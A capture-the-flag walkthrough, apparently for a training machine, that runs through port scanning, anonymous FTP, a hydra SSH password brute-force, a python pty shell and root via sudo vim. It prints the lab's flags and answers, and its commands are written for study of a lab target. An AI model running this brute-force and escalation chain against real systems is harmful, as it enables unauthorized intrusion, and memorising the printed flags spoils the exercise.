# Initial Scan

Let's start with an Nmap scan. The scan reveals three open ports:

* 21 ftp
* 80 http
* 2222 ssh

Open ports under 1000: `2`

# Web

We don't even need to browse the webpage to exploit this machine, but we have questions to answer, so here we go.

I ran `gobuster` on the webpage and found `/simple`:

By navigating to this directory, we face the defaul page for CMS Made Simple. If you scroll down the page, we can see the version:

<p align="center"><img src="./files/CMS.png"></p>

I looked up this version in `searchsploit` and found an exploit for it:

Now we can answer the questions of this part:

CVE: `CVE-2019-9053`

Vulnerability: `SQLI`

# FTP

Now we can go back to the original way I exploited this machine. Let's connect to FTP service, since anonymous login is allowed. I found a txt file in there and downloaded it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Simple_CTF/files]
└─$ ftp $IP

~~~

The file is a note for user `mitch` and the sender is complaining about mitch's weak password:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Simple_CTF/files]
└─$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
~~~

This is useful for us, because we might be able to brute-force the password.

# SSh
## Brute-forcing SSH

I used `hydra` to brute-force the password for user `mitch`:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Simple_CTF]
└─$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://$IP:2222

~~~

Mitch's password: `secret`

## Log into SSH

Now that we have the credentials for SSH service, we can login and the first thing I did was spawning a TTY shell:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Simple_CTF]
└─$ ssh mitch@$IP -p2222
mitch@10.10.134.5's password:

$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
mitch@Machine:~$
~~~

Logged into: `SSH`

## User Flag

Now we have a shell and can read the user flag in our home directory:

~~~
mitch@Machine:~$ ls
user.txt
mitch@Machine:~$ cat user.txt 
G00d j0b, keep up!
~~~

User flag: `G00d j0b, keep up!`

## Other User

We are asked the name of the other user. We can find the other user by simply running `ls` for `/home`:

~~~
mitch@Machine:~$ ls /home
mitch  sunbath
~~~

Other user: `sunbath`

## Becoming root

Now we need to gain root access, in order to obtain the root flag. I ran `sudo -l` to check my sudo permissions:

~~~
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
~~~

We can run `vim` with sudo command and no password. Just run `sudo vim` and then type `:shell` and we have a root shell:
~~~
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Used to privesc: `vim`

## Root Flag

Now we are root and can read the root flag in `/root`:
~~~
root@Machine:~# cd /root
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt 
W3ll d0n3. You made it!
~~~

Root flag: `W3ll d0n3. You made it!`


# D0N3! ; )

Thanks to the creator(s).

Hope you had fun!

And remember to make it a good one! : )
